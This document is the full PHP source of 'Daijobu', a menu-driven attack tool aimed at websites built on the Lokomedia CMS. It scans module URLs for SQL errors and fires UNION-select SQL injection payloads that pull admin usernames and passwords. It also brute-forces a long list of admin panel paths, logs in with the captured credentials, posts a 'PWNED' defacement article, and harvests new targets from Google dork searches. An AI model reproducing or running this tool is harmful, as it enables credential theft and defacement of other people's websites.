<?php
/************************************************
| Daijobu - lokomediacms scanner
| Codename  : yamete kudasai
| Version   : 1.2
| Author    : alinko (shutdown57)
| @github   : https://github.com/alintamvanz
| @twitter  : https://twitter.com/alinmansby
| copyright (c) 2k16 linuxcode.org 
*************************************************/
function a_cover(){
@system('clear');
$n="\033[1;37m";
$m="\033[1;31m";
$h="\033[1;32m";
print"
              ___$m   ____        _   _       __          $n   ___         
    __  _____/ _/$m  / __ \____ _(_) (_)___  / /_  __  __ $n  /  /____  __ 
 __/ /_/____/ / $m  / / / / __ `/ / / / __ \/ __ \/ / / / $n  / /____/_/ /_
/_  __/____/ / $m  / /_/ / /_/ / / / / /_/ / /_/ / /_/ /  $n / /____/_  __/
 /_/      / / $m  /_____/\__,_/_/_/ /\____/_.___/\__,_/ $n _/ /      /_/   
         /__/$m                /___/                   $n /__/             

       +------===[$h Codename   :$n Yamete kudasai.
        +-----===[$h Version    :$n 1.2
         +----===[$h Author     :$n alinko (shutdown57)
          +---===[$h Site       :$n linuxcode.org - alinkoproject.com

\n
[$h 1 $n] Scan Website
[$h 2 $n] Scan Vulnerable Website
[$h 3 $n] Auto Injection
[$h 4 $n] Find Admin
[$h 5 $n] Auto login & deface
[$h 6 $n] Dorking Target
[$h 9 $n] Exit.
";
}
function a_nyeken($url,$m){
@define('c',curl_init());;
curl_setopt(c,CURLOPT_URL,$url);
curl_setopt(c,CURLOPT_RETURNTRANSFER,1);
curl_setopt(c,CURLOPT_BINARYTRANSFER,1);
curl_setopt(c,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt(c,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt(c,CURLOPT_SSL_VERIFYHOST,0);
$o=curl_exec(c);
return preg_match("/".$m."/",$o);
curl_close(c);
}
function a_depes($url){
@define('c',curl_init());
curl_setopt(c,CURLOPT_URL,$url);
curl_setopt(c,CURLOPT_FOLLOWLOCATION,1);
curl_setopt(c,CURLOPT_RETURNTRANSFER,1);
curl_setopt(c,CURLOPT_BINARYTRANSFER,1);
curl_setopt(c,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt(c,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt(c,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt(c,CURLOPT_POST,1);
curl_setopt(c,CURLOPT_POSTFIELDS,array(
	"judul"=>"pwned ? shutdown57",
	"headline"=>"Y",
	"isi_berita"=>"<h1>PWNED ? shutdown57 </h1>",
	));
$o=curl_exec(c);
return preg_match("/pwned/",$o);
curl_close(c);
}
function a_ugh($url,$username,$password){
@define('c',curl_init());
curl_setopt(c,CURLOPT_URL,$url);
curl_setopt(c,CURLOPT_FOLLOWLOCATION,1);
curl_setopt(c,CURLOPT_RETURNTRANSFER,1);
curl_setopt(c,CURLOPT_BINARYTRANSFER,1);
curl_setopt(c,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt(c,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt(c,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt(c,CURLOPT_COOKIEJAR,"output/cookie_daijobu.txt");
curl_setopt(c,CURLOPT_COOKIEFILE,"output/cookie_daijobu.txt");
curl_setopt(c,CURLOPT_POST,1);
curl_setopt(c,CURLOPT_POSTFIELDS,array(
	"username"=>$username,
	"password"=>$password,
	));
$o=curl_exec(c);
return preg_match("/Logout/",$o);
curl_close(c);
}
function a_o(){
echo"\033[1;34m @Daijobu/\033[1;32mOptions/ :\033[1;37m"; $o=trim(fgets(STDIN));
#start elseif 1
if($o=="1"){
echo"\033[1;34m @Daijobu/\033[1;32mScan/\033[1;31mSet Target/ :\033[1;37m"; $t=trim(fgets(STDIN));	
echo"\n[".date('H:m:s')."]\033[1;32m RUNNING SCAN... \033[1;34m CTRL+C \033[1;37m For Stop Scanning.. \n\n";
if(!empty($t)){
$t=(!preg_match("/^http:|^https:/",$t)) ? "http://".$t : $t=$t;
$mod=array("detailberita","detailkategori","detailproduk","detailartikel","halamanstatis","detailalbum");
foreach($mod as $mm){
for($i=1;$i<=200;$i++){
$url=$t."/media.php?module=".$mm."&id=".$i;
if(a_nyeken($url,"404|403|Error|Forbidden|Not Found")){
echo"[".date('H:m:s')."] [\033[1;31m ENOD \033[1;37m] $url \n";
}else{
echo"[".date('H:m:s')."] [\033[1;32m DONE \033[1;37m] $url \n";
}
}
}
echo "[".date('H:m:s')."] Stopped !\n";
a_o();
}
a_cover();
a_o();
#end elseif 1
}elseif($o=="2"){
echo"\033[1;34m @Daijobu/\033[1;32mVuln/\033[1;31mSet Target/ :\033[1;37m"; $t=trim(fgets(STDIN));
echo"\n[".date('H:m:s')."]\033[1;32m RUNNING SCAN... \033[1;34m CTRL+C \033[1;37m For Stop Scanning.. \n\n";
if(!empty($t)){
$t=(!preg_match("/^http:|^https:/",$t)) ? "http://".$t : $t=$t;
$mod=array("detailberita","detailkategori","detailproduk","detailartikel","halamanstatis","detailalbum");
foreach($mod as $mm){
for($i=1;$i<=200;$i++){
$url=$t."/media.php?module=".$mm."&id=".$i."'";
if(a_nyeken($url,"mysql_fetch_array|mysql_rows|SQL Syntax")){
echo"[".date('H:m:s')."] [\033[1;32m VULN \033[1;37m] $url \n";
}else{
echo"[".date('H:m:s')."] [\033[1;31m NLUV \033[1;37m] $url \n";
}
}
}
echo "[".date('H:m:s')."] Stopped !\n";
a_o();
}
a_cover();
a_o();
#end elseif 2
}elseif ($o=="3") {
echo"\033[1;34m @Daijobu/\033[1;32mSQLi/\033[1;31mSet Target Vulnerable/ :\033[1;37m"; $t=trim(fgets(STDIN));
echo"\n[".date('H:m:s')."]\033[1;32m RUNNING SCAN... \033[1;34m CTRL+C \033[1;37m For Stop Scanning.. \n\n";
if(!empty($t)){
$t=(!preg_match("/^http:|^https:/",$t)) ? "http://".$t : $t=$t;
if(!preg_match("/=./",$t)){
	echo"Target Should Written Like \033[1;34m http://target.com/media.php?module=detailberita&id=.57 \033[1;37m \n [\033[1;32m add point before id value \033[1;37m ]\n ";
}else{ 
echo "[".date('H:m:s')."] Trying 8 Queries...\n";
$a=array(
	"+'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x23,username,0x3a574f533a,password,0x3c62723e)),@)--+",
	"'+union+select+concat(username,0x3a574f533a,password)+from+users--+",
	"'+union+select+concat(username,0x3a574f533a,password)+from+admins--+",
	"'union+select+make_set(6,@:=0x0a,(select(1)from(admins)where@:=make_set(511,@,0x23,username,0x3a574f533a,password,0x3c62723e)),@)--+",
	"'+union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x23,user,0x3a574f533a,pass,0x3c62723e)),@)--+",
	"'+union+select+concat(user,0x3a574f533a,pass)+from+users--+",
	"'+union+select+concat(user,0x3a574f533a,pass)+from+admins--+",
	"'+union+select+make_set(6,@:=0x0a,(select(1)from(admins)where@:=make_set(511,@,0x23,user,0x3a574f533a,pass,0x3c62723e)),@)--+");
foreach($a as $u){
$url=$t.$u;
if(a_nyeken($url,":WOS:")){
echo"[".date('H:m:s')."] [\033[1;32m INJECTED \033[1;37m] $url \n";
}else{
echo"[".date('H:m:s')."] [\033[1;31m DETCEJNI \033[1;37m] $url \n";
}
}
echo "[".date('H:m:s')."] Stopped !\n";
a_o();
}
}
a_cover();
a_o();
# end elseif 3
}elseif ($o=="4") {
echo"\033[1;34m @Daijobu/\033[1;32mFindAdmin/\033[1;31mSet Target/ :\033[1;37m"; $t=trim(fgets(STDIN));
echo"\n[".date('H:m:s')."]\033[1;32m RUNNING SCAN... \033[1;34m CTRL+C \033[1;37m For Stop Scanning.. \n\n";
if(!empty($t)){
$t=(!preg_match("/^http:|^https:/",$t)) ? "http://".$t : $t=$t;
$adm=array("adminweb/","webadmin/","redaktur/","paneladmin/","adminpanel/","apanel/","redaksi/","laporan/","sysadmin/","minamin/","minadmin/","timadmin/","padmin/","admin/","pakadmin/","ngadimin/","oalah/","adm/","_adm/","_administrator_/","administrator/","ketua/","sika/","user/","users/","dinkesadmin/","retel/","author/","panel/","paneladmin/","panellogin/","cp-admin/","master/","master/index.php","master/login.php","operator/index.php","sika/index.php","develop/index.php","ketua/index.php","redaktur/index.php","admin/index.php","administrator/index.php","adminweb/index.php","user/index.php","users/index.php","dinkesadmin/index.php","retel/index.php","author/index.php","panel/index.php","paneladmin/index.php","panellogin/index.php","redaksi/index.php","cp-admin/index.php","operator/login.php","sika/login.php","develop/login.php","ketua/login.php","redaktur/login.php","admin/login.php","administrator/login.php","adminweb/login.php","user/login.php","users/login.php","dinkesadmin/login.php","retel/login.php","author/login.php","panel/login.php","paneladmin/login.php","panellogin/login.php","redaksi/login.php","cp-admin/login.php","terasadmin/","terasadmin/index.php","terasadmin/login.php","rahasia/","rahasia/index.php","rahasia/admin.php","rahasia/login.php","dinkesadmin/","dinkesadmin/login.php","adminpmb/","adminpmb/index.php","adminpmb/login.php","system/","system/index.php","system/login.php","webadmin/","webadmin/index.php","webadmin/login.php","wpanel/","wpanel/index.php","wpanel/login.php","adminpanel/index.php","adminpanel/","adminpanel/login.php","adminkec/","adminkec/index.php","adminkec/login.php","admindesa/","admindesa/index.php","admindesa/login.php","adminkota/","adminkota/index.php","adminkota/login.php","admin123/","admin123/index.php","admin123/login.php","logout/","logout/index.php","logout/login.php","logout/admin.php","adminweb_setting",);
foreach($adm as $a){
$url=$t."/".$a;
if(a_nyeken($url,"username|password|adminpanel|login|masuk")){
echo"[".date('H:m:s')."] [\033[1;32m FOUND \033[1;37m] $url \n"	;
}else{
	echo"[".date('H:m:s')."] [\033[1;31m DNOUF \033[1;37m] $url \n";
}	
}
echo "[".date('H:m:s')."] Stopped !\n";
a_o();	
}
a_cover();
a_o();
#end elseif 4
}elseif ($o=="5") {
echo"\033[1;34m @Daijobu/\033[1;32mLogin&Deface/\033[1;31mSet Target admin page/ :\033[1;37m"; $t=trim(fgets(STDIN));
echo"\033[1;34m @Daijobu/\033[1;32mLogin&Deface/\033[1;31mSet Username/ :\033[1;37m"; $u=trim(fgets(STDIN));
echo"\033[1;34m @Daijobu/\033[1;32mLogin&Deface/\033[1;31mSet Password/ :\033[1;37m"; $p=trim(fgets(STDIN));
echo"\n[".date('H:m:s')."]\033[1;32m LOGGIN... \033[1;34m CTRL+C \033[1;37m For Stop.. \n\n";

$t=(!preg_match("/^http:|^https:/",$t)) ? "http://".$t : $t=$t;
if(a_ugh($t,$u,$p)){
echo"[".date('H:m:s')."] \033[1;31m FAILED TO LOGIN, GOMENNASAI.. \n";
}else{
echo"[".date('H:m:s')."] \033[1;32m LOGIN SUCCESSFULLY, \033[1;37m \n";
echo"[".date('H:m:s')."] \033[1;34m DEFACING ON PROCCESS... \033[1;37m \n";
if(a_depes($t."/modul/mod_berita/aksi_berita.php?module=berita&act=input")){
echo"[".date('H:m:s')."] \033[1;32m DEFACE SUCCESSFULLY..\033[1;37m \n";
}else{
echo"[".date('H:m:s')."] \033[1;31m DEFACE FAILED,GOMENNASAI.. \033[1;37m\n";
}
}
a_cover();
a_o();
# end elseif 6
}elseif ($o=="6") {
function save($data){
		$fp = @fopen("output/dork_daijobu.html", "a") or die("cant open file");
		fwrite($fp, $data);
		fclose($fp);
}
$list = array();
$b = 5;
echo"\033[1;34m @Daijobu/\033[1;32mGooGle/\033[1;31m Input Dork/ :\033[1;37m"; $t=trim(fgets(STDIN));
$dork = urlencode($t);
	for($i=0;$i+=$b;$i++){
		echo"[".date('H:m:s')."] (\033[1;34m$i\033[1;37m) \033[1;32m loading \033[1;37m... \n"; 
@define('c',curl_init("https://www.google.com/search?q=$dork&btnG=Search&start=$i#q=$dork&start=$i"));
curl_setopt(c,CURLOPT_RETURNTRANSFER,1);
curl_setopt(c,CURLOPT_FOLLOWLOCATION,1);
curl_setopt(c,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt(c,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt(c,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt(c,CURLOPT_COOKIEJAR,"output/cookie_dork.txt");
curl_setopt(c,CURLOPT_COOKIEFILE,"output/cookie_dork.txt");
$r = curl_exec(c); 

preg_match_all("/style=\"white-space:nowrap\"><c(.*?)\//",$r,$a);
foreach($a[1] as $s){
$site = explode("ite class=\"_Rm\">", $s);
$su = parse_url("http://".@$site[1]."", PHP_URL_HOST);
if(!in_array($su,$list)){
	$list[] = $su;
	echo "[".date('H:m:s')."] $su \n";
	save("$su<br>");
	

}
else{
	echo "[".date('H:m:s')."] \033[1;31m $su \033[1;37m \n";
}
}

}
a_cover();
a_o();
# end elseif 9
}elseif ($o=="9") {
	print "\n\n [-] Exiting program...";
	@system('clear ; sleep 3 ; exit');
}else{
	a_cover();
	a_o();
}
}

a_cover();
a_o();
